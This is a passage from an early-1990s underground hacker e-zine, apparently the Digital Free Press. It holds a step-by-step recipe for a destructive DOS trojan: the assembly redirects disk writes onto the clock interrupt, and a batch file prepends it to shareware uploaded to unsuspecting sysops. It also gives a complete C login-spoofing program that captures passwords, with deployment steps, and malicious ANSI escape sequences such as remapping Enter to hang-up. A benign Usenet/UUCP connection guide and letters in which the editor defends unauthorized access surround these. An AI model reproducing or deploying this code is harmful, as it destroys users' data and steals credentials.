INIT:
      lea AX, E_O_P
      mov ES:word ptr [BX] + 14, AX
      mov ES:word ptr [BX] + 16, CS
      jmp short QUIT

INPUT_STATUS:
KEY_READY:
NONDSTRCT_IN:
INPUT_DATA:
OUTPUT_DATA:
OUTPUT_VERIFY:
CHK_MEDIA:
MAKE_BPB:
IOCTL_IN:
IOCTL_OUT:
OUTPUT_STATUS:
CLEAR_OUTPUT:
CLEAR_INPUT:
QUIT:
      or ES:word ptr [BX] + 3, 0100h
      pop BP
      pop DI
      pop SI
      pop DX
      pop CX
      pop BX
      pop AX
      pop DS
      pop ES
      ret
E_O_P:
DEVICE    endp
CSEG    ends
      end DEVICE

 +---- Cut Here ----+---- Cut Here ----+---- Cut Here ----+---- Cut Here ---+

]============================================================================[

 underg!tsf!gnr@uunet.uu.net (GodNet Raider)
         -=[ "You gotta learn to listen, before you learn to play." ]=-

------------------------------------------------------------------------------
------------------
| Article 5 of 8 |
------------------

To: hackers@underg.UUCP
Subject: Text phile 2
From: bbc@tsf.UUCP (The BBC)
Organization: The CyberUnderground

    Welcome class... An now... for another lesson in the misuse of
computers...

    So you thought that INJECT.BAT was fun... But you did not like
the idea of making the injection give the fun away by causing the
host program to crash after the trojan ran... Well then lets get a
little more sophisticated then... Now rather than overwriting the
existing host code lets just... Oooooh... Say... Add a new function
to an existing program... Now what to add... Something
destructive???? Why not...

    Ok How about a bit o' code that just moves the absolute disk
write interrupt to the clock interrupt... Then each time the clock
ticks (about 18 times a second) the computer attempts a disk write
with random data... Good way to test THOSE ol' ALT-CTRL-DEL
reflexes... Oooooh... What fun, it is to crash, in a one drive
nonbacked-up system...

    Well now for the fun part...

    Step 1:

        Make a batch file called "ADDON.BAT" an in it place
        the following commands -

        =============================================================
         echo off
         cls
         rename %2 ~~temp2.~tp > nul
         copy %1+~~temp2.~tp %2 /b > nul
         erase ~~temp2.~tp > nul
        =============================================================

    Step 2:

        Make a ASM file called "TROJAN.ASM" an in it place the
        following -

        =============================================================
         PROGSEG    segment para public 'CODE'
             assume CS:PROGSEG
         DOIT    proc
                 wSaveDS dw 9090h   ; Store old DS register here...
                 mov AX, DS
                 mov CS:wSaveDS, AX ; Save DS address for hosts'
                                    ;     use...

                 ;-------------- v Place Trojan Here v -------------;

                 mov AX, 3526h ; Get DOS absolute write interrupt...
                 int 21h
                 mov DX, BX    ; Set clock interrupt to returned
                               ;     value...
                 mov AX, ES
                 mov DS, AX
                 mov AX, 2508h
                 int 21h
                 xor BX, BX   ; Rezap used registers [other than
                              ;    AX/DS/ES]...
                 xor CX, CX
                 xor DX, DX

                 ;--------------- ^ Place Trojan Here ^ ------------;

                 mov AX, CS:wSaveDS   ; Restore DS, ES registers for
                                      ;     host...
                 mov DS, AX
                 mov ES, AX
                 xor AX, AX
         DOIT    endp                 ; Host will start after this
                                      ;     point...
         PROGSEG ends
                 end
        =============================================================

    Step 3:

        Then assemble and link the trojan file. Use exe2bin [or
        whatever utility you have to convert .EXEs to .COM format]
        to make a .COM file out of TROJAN.EXE.....

    Step 4:

        Then copy a *.COM file into the same directory. Should
        be part of some shareware thing that the target sysop would
        like. With docs an all... would not want them to get
        suspicious, now would we.............

    Step 5:

         Run the following command from the dos prompt...

             ADDON  

    Step 6:

       Upload the mess to the unsuspecting sysop and watch the fun!


    See and you thought hacking was hard...... Of course if they
get smug and start searching for the added code.... We'll just have
to add extra code (nops' ect) and/or switching some of the code
around in the ASM file...

'Another fine mess' from...
The BBC

---------------------------------------------------------------------
 ...uunet!rayssd!galaxia!underg!tsf!bbc (The BBC)
             -=[ "Anarchy is never HAVING to say you're sorry." ]=-

------------------------------------------------------------------------------
------------------
| Article 6 of 8 |
------------------

                                                        Breaches of Security
                                                                          by
                                                                   The Joker
                                                       ----------------------

    Hello loves, Here we are with yet another page from the _Tomb of
Ultimate Evil_ (THOSE of good aliment must make a saving throw against
neophytedom).

    Todays chat is on the subject of collecting passwords, not that anyone
here would have nothing but nobel reasons to do such a thing. An in
this wonderfully wacky world of networks, UNIX, and VMS it's just the in
t'ing to do. So now boys and girls, hacks and hacketts, Rocky and
bullwinkel let us begin.

    Ah, what a tangled web we weave when first we practice to deceive...
Yet how easy it makes it to get what we want. An deception is the key
here. For thanks to the simple format of most logins (name, password...
rank, serial number, underwear condition...). The simplicity of the answer
makes it a wonderful little exercise in shell programming.

    What is needed is a simple program that pretends it's a login shell
and is set like a little program beartrap. Sitting quietly, waiting
for that most elusive of pray... The north american password! (An them's
good eating too). So as we send our assistant into the system to wrestle
and subdue the foul beasty, let us listen to a message from the good folks
at Mutual of Omaha... Ooop sorry, instead let us look at a model of a simple
password capture shell. What? You want the insurance commercial instead...
Well, tough cookies.

|------------------------------[ Cut Line ]----------------------------------|

/*
    LogTrap.c
        (c) 1992 by Joculator inc., no rights reserved (or respected).
            Rubber cell #182
            Arkham Asylum
            Gotham City

        Captures first login attempt by a user, to file (*szKeepFile),
    then give phony error (*szPhonyError) and call real login shell
    (*aszRealShell []). For the express purpose of promoting glorious
    world chaos.
*/

#include 
#include 
#include 

#define TRUE 1
#define MAX_BUFFER 256
#define ECHO 0
#define NOECHO 1
#define NEWLINE "\n"
#define ANSI_CLS "\x1b[2J"
#define ANSI_NOECHO "\x1b[8m                                        \x1b[40D"
#define ANSI_ECHO "\x1b[0m"

struct
    {
     char
        *szPrompt,
        fNoEcho;
    } *ptPrompts,
      Prompts [] =  /* Prompts patterned after real login shell. */
        {
      /* [Prompt string], [ECHO | NOECHO] */
         "Login: "      , ECHO,
         "Password: "   , NOECHO,
         NULL
        };

char
    *szPhonyError = "Invalid login.\n",    /* Error patterned after LOGIN. */
    *aszRealShell [] =  /* Command to call real LOGIN. */
        {
         "LOGIN",
          /* list parameters (if any) here */
          NULL
         },
    *szKeepFile = "~tmp0167.tmp",   /* Save booty in... */
    szWorkBuffer [MAX_BUFFER];

void
    main (void);

void main (void)
{
    FILE
        *OutStream;

    /* Cover our tracks. */
    printf (ANSI_CLS);
    /* Prompt for and save user information. */
    for (ptPrompts = Prompts; ptPrompts->szPrompt; ptPrompts++)
        {
         printf (ptPrompts->szPrompt);
         if (ptPrompts->fNoEcho)
            printf (ANSI_NOECHO);
         fgets (szWorkBuffer, MAX_BUFFER, stdin);
         if (ptPrompts->fNoEcho)
             printf (ANSI_ECHO);
         /* If file error, ignore it but, don't try to write to file. */
         if (OutStream = fopen (szKeepFile, "a"))
            {
             fputs (ptPrompts->szPrompt, OutStream);
             fputs (szWorkBuffer, OutStream);
            }
         fclose (OutStream);
        }
    /* Stick tongue out, Naaaa... */
    printf (szPhonyError);
    /* Commit process suicide by running LOGIN shell on top of our process. */
    /* It should not return (unlike a bad check). */
    execvp (aszRealShell [0], &aszRealShell [1]);
    /* if execvp () (it got to this point?), lock system. */
    while (TRUE);
}

|------------------------------[ Cut Line ]----------------------------------|

    So there you have it. Now all that is left to do is:

        1: Set Prompts [], *szPhonyError, and *aszRealShell [] to match the
           LOGIN of the target system.

        2: Set *szKeepFile to where you want your ill gotten booty to go.

        3: Compile the whole mess.

        4: LOGIN to the target system and run the program. For more fun
           place copies on more than one terminal, if possible, on the same
           system.

        5: Run to your duck blind and wait for a user to spring your lil'
           trap.

    That's it, have fun, And remember...
        If someone offers you drugs, just say... Yo!

----------------------------------------------------------------------

 ...uunet!rayssd!galaxia!underg!tsf!joker (The Joker)
       -=[ "All it takes is one bad day, then maddness has its way." ]=-

------------------------------------------------------------------------------
------------------
| Article 7 of 8 |
------------------

                           Getting on Usenet
                              by Max Cray

    Much of the information from this phile comes from the excellent text
phile INTRO.DOC that comes with the Waffle BBS package. Other information
was gained from various books, and postings on the net itself, especially
the FAQs (Frequently Asked Questions) postings in news.answers, and also my
personal experience.

    Before you actually connect your machine to Usenet, it may be easier
for you to learn about Usenet, and what it can do for you, by calling a
BBS that is connected to Usenet. Good choices would be my own Underground,
or any of the systems listed in the *nixpub. This is a document regularly
posted to the Usenet listing all known unix bbs systems. You can get a copy
of this from my bbs or from the following sources:

            o  anonymous uucp from jabber.
                    +1 215 348 9727 [Telebit access]
                    LOGIN: nuucp  NO PWD   [no rmail permitted]
                this list: /usr/spool/uucppublic/nixpub.short
                long list: /usr/spool/uucppublic/nixpub
            o  "*NIX Depot" BBS on jabber.
            o  USENET, regular posts to:
                    comp.misc
                    alt.bbs
            o  the nixpub electronic mailing list.
                    to be included or deleted from this distribution,
                    send mail to nixpub-list-request@ls.com.
            o  anonymous ftp from GVL.Unisys.COM [128.126.220.102]
                    under ~/pub/nixpub/{long,short}
            o  archive server from cs.widener.edu.
              mail to archive-server@cs.widener.edu
              Subject: or body of
                send nixpub long
               or
                send nixpub short
               or
                send nixpub long short
               or even
                index nixpub

    I will talk more about anonymous uucp, mailing lists, and archive servers
in a minute.

UUCP SOFTWARE

    The first thing you need to connect your machine to the Usenet is
software, and the first choice would be a version of the unix operating system
itself. In fact to get a copy of the real thing is not that expensive anymore.
As of this writing Consensys Corporation (1301 Pat Booker Rd., Universal City,
TX, 78148, 1-800-387-8951) has UNIX System V Release 4 (the latest) including
C development, Networking, and X Windows, for 386+ systems for $495. Certainly
a big chunk of change, but a great deal for what you get. If cost is important
you might try Coherent by Mark Williams Company (60 Revere Dr., Northbrook,
IL. 60062, 1-800-627-5967). This is a less robust unix clone os that should
run on any pc compatible computer. The price is right at $100. If you just
want uucp connectivity, but you don't want to switch to a real operating
system, then you might want to check out the Waffle BBS package. It can be
found at SIMTEL, UUNET, or also can be gotten from the source: darkside.com
BBS at 1-408-245-SPAM (e-mail: dell@vox.darkside.com), or from The Underground
BBS. The package does not need to be run as a bbs, but can also be run as a
personal system, and it is shareware. If you want freeware, then you might be
interested in UUPC which can also be gotten from SIMTEL, UUNET, or from my
bbs. Source code is available.

    Once you have software, read and re-read the docs. Get a friend to connect
with you and learn how to use your software before you bother a sysadmin with
connecting to Usenet proper.

CONNECTING TO USENET

    And now the hard part: you need to find someone to feed you. Mail feeds
are usually not too difficult, but newsfeeds are harder to come by as they
take more resources from the host machine than mail feeds due to the much
larger volume of information. Possible sources of feeds include:

    - Systems on the previously mentioned *nixpub listing.
    - Local colleges or universities.
    - Systems found scanning the uucp maps.

        These can be gotten using anonymous uucp from UUNET, or also from
        the mail server at MIT. You can request an index of the maps by
        sending email to 'mail-server@pit-manager.mit.edu' with this message:

            path 
            send usenet/comp.mail.maps/index
            quit

        You can get help for this mail server by replacing the 'send' line
        with just 'help'. You can see how being on the net already helps you
        to get your machine on the net. The uucp maps are also an excellent
        hackers tool as they list the sites in your area, points of contact,
        and how they connect up to each other (at least for uucp connections).

        I believe older copies of the uucp maps can be found in the TELECOM
        or UNIX forums on Compuserve.

    - Pay services.

    Here are some of the providers:

      o Anterior Technology
        P.O. Box 1206
        Menlo Park, CA  94026-1206
        Voice: (415) 328-5615
        info@fernwood.mpk.ca.us
        (UUCP, connectivity, name service, MX forwarding, news feeds)

      o CERFnet
        P.O. Box 85608
        San Diego, CA  92186-9784
        Voice: (800) 876-CERF
        help@cerf.net
        (connectivity, name service, MX forwarding, news feeds)

      o Colorado SuperNet, Inc.
        Attn: David C. Menges
        Colorado School of Mines
        1500 Illinois
        Golden, CO  80401
        Voice: 303-273-3471
        dcm@csn.org
        (UUCP, news feeds)

      o MSEN, Inc.
        628 Brooks Street
        Ann Arbor, MI 48103
        Voice: (313) 741-1120
        info@msen.com
        (UUCP, connectivity, name service, MX forwarding, news feeds)

      o MV Communications, Inc.
        P.O. Box 4963
        Manchester, NH  03108-4963
        Voice: (603) 429-2223
        Data: (603) 429-1735 (log in as "info" or "rates")
        info@mv.mv.com
        (UUCP, name service, MX forwarding, news feeds)

      o NEARnet
        Attn: John Curran
        BBN Systems and Technologies
        MS 6/3B
        10 Moulton Street
        Cambridge, MA  02138
        Voice: (617) 873-8730
        jcurran@nic.near.net
        (connectivity, name service, MX forwarding, news feeds (for
         NEARnet sites))

      o Netcom - Online Communication Services
        P.O. Box 20774
        San Jose, CA 95160
        Voice: (408) 554-8649
        bobr@netcom.com
        (UUCP, connectivity, name service, MX forwarding, news feeds)

      o SURAnet
        8400 Baltimore Blvd.
        College Park, MD  20742
        Voice: (301) 982-3214
        news-admin@sura.net
        (connectivity, name service (for SURAnet sites), news feeds (for
         SURAnet sites))

      o UUNET Canada, Inc.
        1 Yonge St., Suite 1801
        Toronto, Ontario
        Canada M5E 1W7
        Voice: (416) 368-6621
        info@uunet.ca or uunet-ca@uunet.uu.net
        (UUCP, connectivity, name service, MX forwarding, news feeds)

      o UUNET Technologies Inc.
        3110 Fairview Park Drive, Suite 570
        Falls Church, VA 22042
        Voice: (703) 876-5050
        info@uunet.uu.net
        AlterNet (network connectivity) info: alternet-info@uunet.uu.net
        (UUCP, connectivity, name service, MX forwarding, news feeds)

     o  UUNORTH, Inc.
        Box 445, Station E
        Toronto, Ontario
        Canada M6H 4E3
        Voice: (416) 537-4930 or (416) 225-UNIX

     o  Performance Systems International, Inc.
        11800 Sunrise Valley Drive, Suite 1100
        Reston, VA  22091
        Voice: (703) 620-6651 or (800) 827-7482
        Computerized info: all-info@psi.com
        Human-based info: info@psi.com
        (UUCP, connectivity, name service, MX forwarding, news feeds)

SUBMIT A UUCP MAP ENTRY

   All machines connecting to the UUCP network should submit
   a UUCP map to the map coordinator, . The
   purpose of these maps is to facilitate finding the fastest
   path between any two systems, and also to prevent duplicate
   names that would cause mail to be lost.

   Maps are posted to comp.mail.maps newsgroup on a fairly
   regular basis. In addition to the maps, there is a README file
   that documents these details in much more detail -- the
   information here is not enough to construct a full map entry.

   You should obtain this README file from one of your neighbors;
   it is also available on the waffle BBS system +1 408 245 SPAM (as
   the file /public/waffle/uucp-map.txt), or it can be found in the
   /public/text/misc directory on The Underground BBS.

   The basic format of the maps consists of a number of lines
   with a # and a letter, followed by a tab and then information
   corresponding to that letter:

  #N    UUCP name of site
  #S    manufacturer machine model; operating system & version
  #O    organization name
  #C    contact person's name
  #E    contact person's electronic mail address
  #T    contact person's telephone number
  #P    organization's address
  #L    latitude / longitude
  #R    remarks
  #U    netnews neighbors
  #W    who last edited the entry ; date edited
  #
  sitename      .domain
  sitename      remote1(FREQUENCY), remote2(FREQUENCY),
        remote3(FREQUENCY)

ARCHIVE SERVERS

   There are many archive servers. These systems provide files via e-mail.
For example the pit-manager mail server at MIT mentioned above is one. You
can get back issues of the Computer Underground Digest from the University
of Chicago archive server. To use the U. of Chicago email server, send mail
with the subject "help" (without the quotes) to:

    archive-server@chsun1.spc.uchicago.edu.

    There are many more archive servers. You can also get binaries using a
pair of utilities called uuencode, and uudecode. These utilities convert
binary code to ascii text code suitable for transmission via e-mail (or to be
posted on when of the many .binaries newsgroups on Usenet.

MAILING LISTS

    Once you have an e-mail account you can join mailing lists. These can be
the electronic equivalent of the newsletters, or they can echo mail to
multiple destinations. For example you mail a certain mail list, and copies
will be echoed to all who are on the list. For example you can sign up for
the Phrack electronic P/H newsletter by:

1.  Send a piece of electronic mail to "LISTSERV@STORMKING.COM".  The mail
    must be sent from the account where you wish Phrack to be delivered.

2.  Leave the "Subject:" field of that letter empty.

3.  The first line of your mail message should read:
    SUBSCRIBE PHRACK 

4.  DO NOT leave your address in the name field!
    (This field is for PHRACK STAFF use only, so please use a full name)

Sign up for the NIA newsletter by sending mail to: nia@nuchat.sccsi.com.

    Incidentally, you do not have to be part of the Usenet, ot the Internet
(the TCP/IP network), to participate. See the excellent article in NIA73
about e-mail gateways between networks "Internet to Anywhere" by Industrial
Phreak.

    I should also mention that with a mail account, you can still post to
a Usenet newsgroup. Send mail to @ucbvax.berkeley.edu. For
newsgroup you want to change any periods to dashes. For example,
alt-bbs@ucbvax.berkley.edu to post to the alt.bbs newsgroup. If you desire
a response to your posting be sure to put in a line like: Please e-mail all
replies.

USING UUCP TO TRANSFER FILES

   The uucp program allows files to be transmitted to and from
   any neighboring system, via the command line.

   To "push" a file from the local machine to the remote machine:

  uucp filename.here unix!~/filename.there

   To "pull" a file into a machine off the remote machine:

  uucp unix!~/filename.there filename.here

    unix is used here as the name of the remote machine.

    For example you can connect to the uunet machine directly via
a 1-900 number, and get access to a wealth of source code and
information about the network. Call 1-900-468-7727 and use the login
"uucp" with no password. Callers are charged 50 cents per minute.
The charges appear on your phone bill.

     The  file  uunet!~/help  contains  instructions.   The  file
uunet!~/ls-lR.Z  contains  a complete list of the files available
and is updated daily.  Files ending in Z need to be uncompressed
before being used.   The file uunet!~/compress.tar is a tar
archive containing the C sources for the uncompress program.

1. How to reach UUNET's 900 number via uucp

   Here are some sample a L.sys or Systems file lines suitable for
   UUNET's 900 number:

   # Simple line.
   uunet Any ACU 19200 1-900-468-7727 in:--in:--in: uucp
   #
   # Set up for a Telebit.
   uunet Any cua0 19200 cua0 "" ATX0S50=255S111=30DT19004687727\r CONNECT ""
       login: uucp

   Modify as appropriate for your site, of course, to deal with your
   local telephone system and uucp version.

   All modems on the 900 lines are Telebit T2500s.  Note that these
   modems first answer with V.32, then at 2400, 1200, and last with PEP
   tones.  This "900" number charges $.50US per minute to the caller.

2. Where the files are

   This file of instructions exists as the file uunet!~/info/archive-help
   uunet!~/ls-lR.Z contains a list of all files available.  This is the
   compressed output of an `ls -lR' command.  This file is updated each
   night.  (Note this file is currently about 520 Kbytes *compressed*).
   Information on other indexes can be found in uunet!~/index/README.
   The file uunet!~/info/layout details the basic organization of the
   archive.

3. File formats

   Files with .Z endings are compressed.  The uncompress program is
   available in uunet!~/compress.tar if you don't have it.

   Some very large files have been split into several files for you.
   This are usually evidenced by sequenced endings after a .Z ending.
  eg: emacs/18.57.Z.01 .. emacs/18.57.Z.39
   After you obtain all of the parts you need only concatenate them
   in the proper order.
  eg: cat 18.57.Z.* > emacs-18.57.Z

UUCP File Transfer Tips

   You must write files you transfer to a directory which the user
   "uucp" has write access.  That user, not you, will actually do the
   transfer.  /usr/spool/uucppublic is the common place used.

   You may see different pathnames for files in an archive which
   equate to the same thing.  For example an archive that is /usr/spool/ftp
   (aka ~ftp), might also accessible as /usr/spool/uucppublic (aka
   ~uucp, or just ~ for UUCP).

   Be sure you use absolute pathnames when specifying remote filename.
   If you don't, your working directory will be prepended to the
   pathname in the command.  uunet!file and uunet!~/file are different.
   uunet!~/ is the best reference to the base of the archive via uucp.

   Permission denied messages normally indicate a file name or
   file access problem.  Be sure to have the latest copy of the file
   list.

   Beware when using shell meta-characters in transfers.  You need to
   escape them in most circumstances (eg: the ! in csh).  Also note
   that there are a number of UUCP implementations which do not handle
   multi-file transfers correctly.  If you pass a * to the remote
   system you may get 'access denied' messages.  These indicate a UUCP
   problem, not a file problem.

OTHER RESOURCES

  In addition to the resources already mentioned, there are several
books which discuss USENET and/or UUCP maintenance.  They include:

  Using UUCP and Usenet; Grace Todino; ISBN 0-937175-10-2
        Date: 1990. Pages: 210. Cost: $24.95

  Managing UUCP and Usenet; Tim O'Reilly and Grace Todino;
        ISBN 0-937175-48-X. Date: 1990. Pages: 289. Cost: $24.95

    Both are "Nutshell" handbooks. O'Rielly and Associates: 981 Chestnut
Street Newton MA 02164 USA, 1-800-338-NUTS. E-mail: ...!uunet!ora!nuts

        Unix Communications; Bart Anderson, Barry Costales, and Harry
        Henderson, Harry; The Waite Group. ISBN 0-672-22773-8. Date: 1991.
        Pages: 736. Cost: $29.95.

    Covers everything the end user needs to know about email, USENET and UUCP.

------------------------------------------------------------------------------
------------------
| Article 8 of 8 |
------------------

To: hackers@tsf.UUCP
Subject: Text phile 3.
From: bbc@tsf.UUCP (The BBC)
Organization: The CyberUnderground

    Welcome, Kiddies... To another jam packed fun day at... The BBC's
crash house... Todays secret word is 'ANSI'... Yes after this lesson
when ever a sysop/user hears the word 'ANSI', They will scream real
loud!!!

    First lets ask our friend Crashy a question... Crashy, do you
use a term package that supports... 'ANSI' [AAAAAAAAHHHHHHH] or have
the driver 'ANSI.sys' [AAAAHHHHH] loaded in your config.sys???
'Well... Yes, I guess'... Good, See kiddies every one uses it but
few understand it... An that is how we will play with the users
of a bbs's mind as well as the sysops [usually not much of one here]...

    First a bit of an explanation... ANSI [AAAAHHHHHHH] is a method
of controlling IO on remote systems... It uses escape sequences to
do every thing from moving the cursor around and changing color of
the text to redefining the keyboard keys... A very useful tool for
helping computer users and making nice displays.. An a cheep shot
as far as hacking games go... But that never stoped us before... For
what if some devious minds where to put them to use??? An we are just
the ones to do it... Also for those who don't know, [ESC] stands for
the escape char. [0x1b] or to type it in remote hold down the ALT key
while typing 27 on the numeric key pad then release the ALT key...

    Lets start with a classic... We all know to change the text color
you use the sequence 'ESC[;;...m' and it will
change the color for all following text till it is used again... Well
what if one uses the command 'ESC[0;8m'... This would cause the ANSI
[AAAAHHHHH] driver to reset the color to default then set the screen
to black text on a black background... What a glorious sight (or lack
of there) when the computer just seems to stop... No text no
nothing... An if they don't reset it, well.... All the boards they
call afterwards will do the same...

    Or how about this one... 'ESC[=0h;=7l'... All it does is set the
screen to 40 column mode and turns line wrapping off... So there eyes
get a rest... only half the calories of a regular screen and in
larger portions...

    Then there is the story of the farmer's 'ESC[26;0H'... Moving the
cursor off the screen and making them wait for the next prompt (if
this command is at the end of a message) that seams to never come...
But you should not tell this joke in polite company...

    An of course we saved the best for last... The ol' Two Face key
change... Just use the command 'ESC[;p' and wha-la
instant chaos... For example 'ESC[13;0;35p', next time the [ENTER]
key is hit it changes into a ALT-H (The hangup command for most
term packages... An we would hope you would not use this to just
redefine the whole keyboard so that what they type is not what
they get!!! That would be.... bad... An you are not a bunch of
bad boys and girls are you... We thought so...

    So boys and girls... Its time to go... and remember...
The night belongs to the hackers... The early hacker gets to DOS...
A virus in the system is worth 2 trojans in the bush... Ect.. Ect..
Ect..

'Another fine mess' from your friends at...
The BBC

----------------------------------------------------------------------
 ...uunet!rayssd!galaxia!underg!tsf!bbc (The BBC)
             -=[ "Anarchy is never HAVING to say you're sorry." ]=-

------------------------------------------------------------------------------
 That's all folks...keep that e-mail coming!
------------------------------------------------------------------------------

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                            -= Max Cray =-
 Internet:   underg!max@uunet.uu.net                         Support
 UUCP:       ...!uunet!idsvax!underg!max                     Free
 Data:       The Underground Computing Foundation BBS        Software
             401-847-2603 -=- 9600 baud (v.32)               (w/src)
 CI$:        76334,2203



              #########             ############       #########
              ###########           ############       ###########
              ####    ####          ####               ####    ####
              ####    ####          ####               ####    ####
              ####    ####          ########           ###########
              ####    ####          ########           #########
              ####    ####          ####               ####
              ####    ####          ####               ####
              ###########           ####               ####
              #########             ####               ####

                             DIGITAL FREE PRESS
-------------------------------------------------------------------------------
                    Volume 1.0                Issue 3.0
-------------------------------------------------------------------------------

       * A Publication of The Underground Computing Foundation (UCF) *

       * Send Subscription Requests to: dfp-req%underg@uunet.uu.net *

            * Send Submissions to: hackers%underg@uunet.uu.net *

              * Editor: Max Cray (max%underg@uunet.uu.net) *

              * BBS: The Underground (401) 847-2603 (v.32) *

          Back issues can be found in the CUD archives at EFF.ORG.

------------------------------------------------------------------------------

                    Statement of Purpose and Disclaimer

    The Digital Free Press is an uncensored forum to document current
activities in and of the world of modern technology. It is published under the
premise that it is better to know, rather than not know, so no attempt is made
to hide any information no matter how dangerous it may be. Information is a
double edged sword. It is neither good nor bad, and can be used for either
good or bad. Warning: Some information in this document could be used for
illegal activities. Use at your own risk. Articles are the opinion of the
authors listed, and not of the editor (unless of course the editor wrote
it).

------------------------------------------------------------------------------
In this Issue:

    1. Mail to Max
    2. Viral Footprints by GodNet Raider
    3. Character Codes by The BBC
    4. Mail Insecurity on Telegard BBS Systems by Hard Rock
    5. The NNSC Info Server by Max Cray

------------------------------------------------------------------------------
Mail to Max:
------------------------------------------------------------------------------

To: max%underg@underg.UUCP
Subject: Re: Digital Free Press #2
Newsgroups: alt.bbs,alt.cyberpunk,comp.org.eff.talk,ri.cug
Organization: The Puzzle Palace, UKentucky
Date: Mon, 9 Mar 92 15:03:42 GMT
From: Wes Morgan 
Sender: uunet!ms.uky.edu!morgan

In article  you write:

>[Editor's note: Lesson here is be sure you know your upstream sysadmin's
>policy on distribution of controversial material. I was able to get the uucp
>connection back, but only after agreeing not to distribute DFP anymore
>through his site.]

I was glad to see this comment.  Given the fact that "the net" now en-
compasses everything from Crays to AppleIIs, cooperation between admins
and users (even in mundane matters such as electronic mail) is more
necessary than ever before.

I was puzzled, however, when I continued reading this issue of DFP.  Even
after you alluded to the importance of foreknowledge, discussion, and
cooperation, you wrote this:

>Accessing and using equipment that you do not own is okay as long as
>you do not prevent those who own it from using it, or damage anything.

How does a remote hacker KNOW the results of his actions?  How will the
remote hacker KNOW if he causes damage?  How does the remote hacker KNOW
that he is using one of a limited number of access ports?  The simple answer,
in many cases, is that he does not, and will not, know the results of many
of his actions.

I have watched hackers attempt to bring my system to a halt through both
subtle and gross methods.  I have watched hackers muck about aimlessly in
user files, erasing/corrupting them at random.  There are some types of
files which can be corrupted by simply opening them with an editor!

[ Editor's comment: How does a hacker know? By trying it and seeing what
happens, of course, or by reading information, asking others. Same way
everyone else learns. Now why would a hacker try to bring down your system?
Hackers *LIKE* computers. Just because someone was trying to cause you harm
does not mean that all hackers are vandals. Perhaps you could post some
guidelines on your machine, for example a list of files not to be opened
with the editor, and ways that those files could be viewed, etc.]

>Sure he got the source code for VMS, but is there any evidence
>that he used this information for personal gain, or did he simply use the
>information to improve his understanding of the VMS operating system?

This is a moot point.  The source code for VMS (or any commercial operating
system) is a copyrighted work.  By securing his own copies, he violated that
copyright law and deprived DEC of revenue.  There are any number of books
available for loan/purchase which give details of operating system design.
I have seen several such texts which explicitly document VMS internals.
Why weren't those texts an acceptable alternative?

[ Editor's comment: You mean Kevin M. would have bought a copy of VMS,
but since he was able to just take it, he deprived them of revenue? I do
not think so. He never would have bought it. DEC has the same amount of
money no matter if Kevin had the code, or not.
    However, I would be interested in that information you have on the
VMS internals.]

>Who owns the Internet?

There is no single entity to which we can assign the label "Internet".  The
"Internet" is, in reality, is a conglomerate of cooperating networks.  Some
of these networks, such as SURANet, are regional networks; these are funded
by their members.  Others, such as THEnet, are limited to a single state;
these are often funded by the government of the State in question.  Others
are not really "networks" at all; uucp, which is based on store-and-forward
via telephone calls (rather than a constant connection over a leased line),
is a good example.  There is a "backbone" which connects many of these par-
ticipating networks; it is known as NSFnet, and it is maintained by the
National Science Foundation.  Many nets which participate in the "Internet"
are commercial; HP, DEC, and IBM have gatewayed their internal networks to
the "Internet".

There may be parts of this conglomerate for which we can determine owner-
ship.  Obviously, HP's network belongs to HP, while THEnet belongs to the
State of Texas.  Their participation in large-scale networking does NOT
effect any change in their ownership of their own networks/systems.

>Is it some mysterious 'them'
>or is it our net?

It is, most assuredly, NOT "our net".  The mere fact that we can access
a facility does NOT imply that we have any rights/privileges whatsoever
on that facility.

Actually, the fact that a network connects two sites is irrelevant.  The
question is a simple one: Have the operators/owners of that site granted
me any privileges to use that system?  If the system in question has a
GUEST login or, perhaps, an anonymous FTP service, then I have been granted
a certain "privilege of use"; if not, I have neither the privilege nor the
right to attempt access to that system.  As I said, the existence of a
connective network is irrelevant; the same rules would apply to me if I
walked into the machine room at that remote site, wouldn't they?

[ Editor's comment: Ok so what good is having access if you don't have any
rights or privledges? Who decides what those rights or privledges are?
Are these rights or privledges stated anywhere? Who said Morris did not
have authorization to write a self-propagating program?]

>If it is our net, then we should be able to try some stuff
>on it, and to heck with 'them' if they can't take a joke.

When someone's "stuff" results in downtime, corrupted files, and trashed
systems, it is NOT a joke.  I know sysadmins who spent days recovering from
hacker "exploration" of their system.  If it's a commercial site (one which
charges for access), it may lose thousands of dollars in revenue during
recovery.  If it's an academic site, hundreds (or thousands) of users may
suffer; research grinds to a halt, academic assignments cannot be finished,
electronic mail stops in its tracks, and all users are displaced by hackers'
exploration.  Is this a "joke"?  Is your "exploration" and "learning" more
important than the work of hundreds, or thousands, of others?

[Editor's comment: Hey mistakes happen. That is part of life. If you can't
handle it then you should not be a sysadmin, and if you do decide to quit
your job let me know. I would love to be a sysadmin and get to work with big
computers.If its a commercial site my heart bleeds for them. If its an
academic site, then maybe everyone learned something from the experience.]

>    It is my contention that hackers did not change. Society changed, and it
>changed for the worse. The environment the early hackers were working in
>correctly viewed these activities as the desire to utilize technology in a
>personal way.

There is an important distinction between the "early hackers" and those of
today.  The early hackers did not operate on any system they could find;
their activities were restricted to local machines.  In a sense, this limita-
tion made them responsible for their activities.  RMS didn't go looking for
systems to "explore" at other universities.  Today, hackers rarely operate
on their own systems; most of them prefer to anonymously wander the networks,
looking for systems which they can use/misuse/abuse.  To me, that "crosses
the line" between "good" and "bad" hacking.  In addition, most of today's
hackers refuse to accept responsibility for their actions.  The Dutch hacker
conglomerate, for instance, believes that they can hack any system in the
world, since hacking is currently legal under Dutch law.  They saw no prob-
lem in hacking/cracking/crashing systems throughout Europe and the USA.  In
fact, one of them said in an interview, "In the real world, I would never
commit a crime."; this person has a badly skewed set of morals, in my opinion.

[ Editor's comment: I do not really see much of a distinction here. Why is it
okay to hack on a local machine that does not belong to you, but not a
networked machine that does not belong to you?
     I agree with you about the responsibility thing. I do think hackers
should be responsible for thier actions, even in cyberspace.]

>By definition hackers believe in the free access to computers
>and to the freedom of information.

This definition, sadly, is no longer correct.  Today's hackers believe
that computing should be free FOR THEMSELVES; they don't really care
about others.  RMS kept to his principles; the gnu.ai.mit.edu systems
provide access for almost anyone who asks.  Some other ex-hackers have
set up public access sites, such as Nyx; these are in keeping with the
hacker ethic of the past.

Today's hackers, on the other hand, don't want to expend any of their
own resources.  In a recent email conversation with a hacker, he claimed
that his lack of resources gave him the "right" (his word) to hack on
other systems through the networks.  That's ridiculous.

